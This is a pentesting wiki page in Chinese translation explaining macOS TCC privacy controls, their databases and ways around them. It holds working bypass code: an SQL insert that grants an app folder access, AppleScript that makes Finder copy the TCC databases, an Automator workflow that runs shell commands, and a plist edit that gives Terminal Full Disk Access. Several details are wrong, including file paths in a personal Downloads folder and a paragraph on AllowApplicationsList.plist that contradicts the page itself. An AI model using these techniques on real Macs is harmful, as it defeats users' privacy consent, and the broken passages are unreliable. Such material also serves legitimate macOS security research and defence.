# macOS TCC

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## **基本信息**

**TCC (Transparency, Consent, and Control)** 是 macOS 中的一种机制，用于从隐私角度**限制和控制应用程序对某些功能的访问**。这些功能可以包括位置服务、联系人、照片、麦克风、摄像头、辅助功能、完全磁盘访问等等。

从用户的角度来看，当应用程序要访问受 TCC 保护的功能时，他们会看到 TCC 的作用。这时，用户会收到一个对话框，询问他们是否允许访问。

用户也可以通过**显式意图**向应用程序授予对文件的访问权限，例如当用户将文件**拖放到程序中**时（显然程序应该具有对文件的访问权限）。

![TCC提示的示例](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** 由位于 `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` 的**守护进程**处理，并在 `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` 中进行配置（注册 mach 服务 `com.apple.tccd.system`）。

每个已登录用户定义了一个在用户模式下运行的 tccd，其位置在 `/System/Library/LaunchAgents/com.apple.tccd.plist`，注册了 mach 服务 `com.apple.tccd` 和 `com.apple.usernotifications.delegate.com.apple.tccd`。

在这里，你可以看到作为系统和用户运行的 tccd：
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
权限是从父应用程序继承的，并且权限是基于Bundle ID和Developer ID进行跟踪。

### TCC数据库

然后，允许/拒绝的内容存储在一些TCC数据库中：

* 系统范围的数据库位于`/Library/Application Support/com.apple.TCC/TCC.db`。
* 此数据库受到SIP保护，因此只有SIP绕过才能写入其中。
* 用户TCC数据库`$HOME/Library/Application Support/com.apple.TCC/TCC.db`用于每个用户的首选项。
* 此数据库受保护，因此只有具有高TCC权限（如完全磁盘访问权限）的进程才能写入其中（但不受SIP保护）。

{% hint style="warning" %}
前面的数据库也受到TCC保护，无法读取常规用户TCC数据库，除非是从具有TCC特权进程中读取。

但是，请记住，具有这些高权限（如FDA或`kTCCServiceEndpointSecurityClient`）的进程将能够写入用户的TCC数据库。
{% endhint %}

* 在`/var/db/locationd/clients.plist`中有第三个TCC数据库，用于指示允许访问位置服务的客户端。
* 受SIP保护的文件`/Users/carlospolop/Downloads/REG.db`（也受TCC的读取访问保护）包含所有有效TCC数据库的位置。
* 受SIP保护的文件`/Users/carlospolop/Downloads/MDMOverrides.plist`（也受TCC的读取访问保护）包含更多TCC授予的权限。
* 可由任何人读取的受SIP保护文件`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`是需要TCC异常的应用程序的允许列表。

{% hint style="success" %}
iOS中的TCC数据库位于`/private/var/mobile/Library/TCC/TCC.db`
{% endhint %}

{% hint style="info" %}
通知中心UI可以对系统TCC数据库进行更改：

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

然而，用户可以使用**`tccutil`**命令行实用程序**删除或查询规则**。
{% endhint %}

#### 查询数据库

{% tabs %}
{% tab title="用户数据库" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}

{% tab title="系统数据库" %}
{% code overflow="wrap" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
检查这两个数据库，您可以查看应用程序允许、禁止或未拥有的权限（它会要求您提供权限）。
{% endhint %}

* **`service`** 是 TCC 权限的字符串表示
* **`client`** 是具有权限的 Bundle ID 或二进制文件的路径
* **`client_type`** 指示它是 Bundle Identifier（0）还是绝对路径（1）

<details>

<summary>如果是绝对路径，如何执行</summary>

只需执行 **`launctl load you_bin.plist`**，其中 `you_bin.plist` 是一个 plist 文件，内容如下：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

* **`auth_value`** 可以有不同的值：denied(0), unknown(1), allowed(2), 或 limited(3)。
* **`auth_reason`** 可以取以下值：Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
* **csreq** 字段用于指示如何验证要执行的二进制文件并授予 TCC 权限：
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
* 有关表格的**其他字段**的更多信息，请[**查看此博客文章**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)。

您还可以在`系统偏好设置 --> 安全性与隐私 --> 隐私 --> 文件和文件夹`中检查应用程序的**已授予权限**。

{% hint style="success" %}
用户可以使用**`tccutil`** **删除或查询规则**。&#x20;
{% endhint %}

#### 重置TCC权限
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC 签名检查

TCC **数据库**存储了应用程序的**Bundle ID**，但它还会**存储**关于**签名**的**信息**，以确保请求使用权限的应用程序是正确的。

{% code overflow="wrap" %}
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
因此，使用相同名称和捆绑标识的其他应用程序将无法访问授予其他应用程序的权限。
{% endhint %}

### 权限和TCC权限

应用程序不仅需要请求并获得对某些资源的访问权限，还需要具备相关的授权。\
例如，Telegram具有授权`com.apple.security.device.camera`以请求对相机的访问权限。没有此授权的应用程序将无法访问相机（用户甚至不会被询问权限）。

然而，对于应用程序访问某些用户文件夹（例如`~/Desktop`，`~/Downloads`和`~/Documents`）并不需要具备任何特定的授权。系统会透明地处理访问并根据需要提示用户。

苹果的应用程序不会生成提示。它们在其授权列表中包含预授予权限，这意味着它们永远不会生成弹出窗口，也不会出现在任何TCC数据库中。例如：
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
这将避免日历询问用户访问提醒事项、日历和通讯录。

{% hint style="success" %}
除了一些关于权限的官方文档外，还可以在[https://newosxbook.com/ent.jl](https://newosxbook.com/ent.jl)找到一些非官方的**关于权限的有趣信息**。
{% endhint %}

一些TCC权限包括：kTCCServiceAppleEvents、kTCCServiceCalendar、kTCCServicePhotos... 没有公共列表来定义所有这些权限，但可以查看这个[**已知权限列表**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service)。

### 敏感的未受保护的位置

* $HOME（本身）
* $HOME/.ssh、$HOME/.aws等
* /tmp

### 用户意图 / com.apple.macl

如前所述，可以通过将文件拖放到应用程序中来**授予应用程序对文件的访问权限**。这个访问权限不会在任何TCC数据库中指定，而是作为文件的**扩展属性**存储。该属性将**存储允许的应用程序的UUID**。
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
有趣的是，**`com.apple.macl`**属性由**沙盒**管理，而不是tccd。

还要注意，如果将允许计算机上某个应用程序的UUID的文件移动到另一台计算机上，因为相同的应用程序将具有不同的UID，它不会授予对该应用程序的访问权限。
{% endhint %}

扩展属性`com.apple.macl`无法像其他扩展属性一样清除，因为它受到SIP的保护。然而，正如[**在这篇文章中解释的**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)，可以通过将文件**压缩**、**删除**和**解压缩**来禁用它。

## TCC权限提升和绕过

### 插入到TCC

如果您成功获得对TCC数据库的写访问权限，可以使用以下类似的方法添加条目（删除注释）：

<details>

<summary>插入到TCC示例</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### 自动化到FDA\*

自动化权限的TCC名称是：**`kTCCServiceAppleEvents`**\
这个特定的TCC权限还指示了可以在TCC数据库中管理的**应用程序**（因此权限不允许仅仅管理所有内容）。

**Finder**是一个**始终具有FDA**的应用程序（即使它在用户界面中不可见），因此如果您对其具有**自动化**权限，您可以滥用其权限来**执行一些操作**。\
在这种情况下，您的应用程序需要对**`com.apple.Finder`**具有**`kTCCServiceAppleEvents`**权限。

{% tabs %}
{% tab title="窃取用户的TCC.db" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias

try
duplicate file sourceFile to targetFolder with replacing
on error errMsg
display dialog "Error: " & errMsg
end try
end tell
EOD
```
{% tab title="窃取系统的TCC.db" %}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias

try
duplicate file sourceFile to targetFolder with replacing
on error errMsg
display dialog "Error: " & errMsg
end try
end tell
EOD
```
{% endtab %}
{% endtabs %}

你可以滥用这个来**编写自己的用户TCC数据库**。

{% hint style="warning" %}
有了这个权限，你将能够**要求Finder访问TCC受限文件夹**并给你文件，但据我所知，你**无法让Finder执行任意代码**来完全滥用他的FDA访问权限。

因此，你将无法滥用完整的FDA功能。
{% endhint %}

这是获取Finder上的自动化权限的TCC提示：

<figure><img src="../../../../.gitbook/assets/image.png" alt="" width="244"><figcaption></figcaption></figure>

{% hint style="danger" %}
请注意，因为**Automator**应用程序具有TCC权限**`kTCCServiceAppleEvents`**，它可以**控制任何应用程序**，比如Finder。因此，如果有控制Automator的权限，你也可以使用下面的代码控制**Finder**：
{% endhint %}

<details>

<summary>在Automator中获取一个shell</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

同样的情况也发生在**Script Editor app**上，它可以控制Finder，但是使用AppleScript无法强制执行脚本。

### **从Endpoint Security Client到FDA**

如果你有**`kTCCServiceEndpointSecurityClient`**，你就有FDA权限。结束。

### 从System Policy SysAdmin File到FDA

**`kTCCServiceSystemPolicySysAdminFiles`**允许**更改**用户的**`NFSHomeDirectory`**属性，从而更改用户的主文件夹，因此可以**绕过TCC**。

### 从User TCC DB到FDA

通过获得**用户TCC数据库的写权限**，你无法授予自己**`FDA`**权限，只有系统数据库中的权限可以授予。

但是你可以给自己**`对Finder的自动化权限`**，并滥用之前的技术来升级到FDA\*。

### **从FDA到TCC权限**

在TCC中，**Full Disk Access**的名称是**`kTCCServiceSystemPolicyAllFiles`**

我不认为这是一个真正的权限提升，但以防万一你觉得有用：如果你控制了一个具有FDA权限的程序，你可以**修改用户的TCC数据库并给自己任意访问权限**。这可以作为一种持久化技术，在你可能失去FDA权限的情况下很有用。

### **从SIP绕过到TCC绕过**

系统的TCC数据库受到SIP的保护，这就是为什么只有具有指定权限的进程才能修改它。因此，如果攻击者找到了一个可以绕过SIP的文件（能够修改受SIP限制的文件），他将能够：

* **移除**TCC数据库的保护，并给自己所有的TCC权限。他可以滥用其中的任何文件，例如：
* TCC系统数据库
* REG.db
* MDMOverrides.plist

然而，还有另一种方法可以滥用这个**SIP绕过来绕过TCC**，文件`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`是一个需要TCC例外的应用程序允许列表。因此，如果攻击者可以**移除该文件的SIP保护**并添加自己的**应用程序**，该应用程序将能够绕过TCC。\
例如，添加终端：
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:

AllowApplicationsList.plist是一个用于macOS的配置文件，用于管理TCC（Transparency, Consent, and Control）框架中的应用程序访问权限。TCC框架是macOS中的一种安全保护机制，用于保护用户的隐私和数据安全。

该配置文件列出了被授权访问敏感数据和功能的应用程序。只有在AllowApplicationsList.plist中列出的应用程序才能访问受TCC保护的资源，例如摄像头、麦克风、联系人、位置等。

要修改AllowApplicationsList.plist文件，需要具有管理员权限。可以使用命令行工具或图形界面工具来编辑该文件。在编辑文件时，需要确保只添加可信任的应用程序到AllowApplicationsList.plist中，以确保用户的隐私和数据安全。

请注意，修改AllowApplicationsList.plist文件可能会导致应用程序无法访问所需的资源。因此，在进行任何更改之前，请确保了解应用程序的访问需求，并谨慎操作。

更多关于TCC框架和macOS安全保护的信息，请参考官方文档和相关资源。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC绕过

{% content-ref url="macos-tcc-bypasses/" %}
[macos-tcc-bypasses](macos-tcc-bypasses/)
{% endcontent-ref %}

## 参考资料

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
*   [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
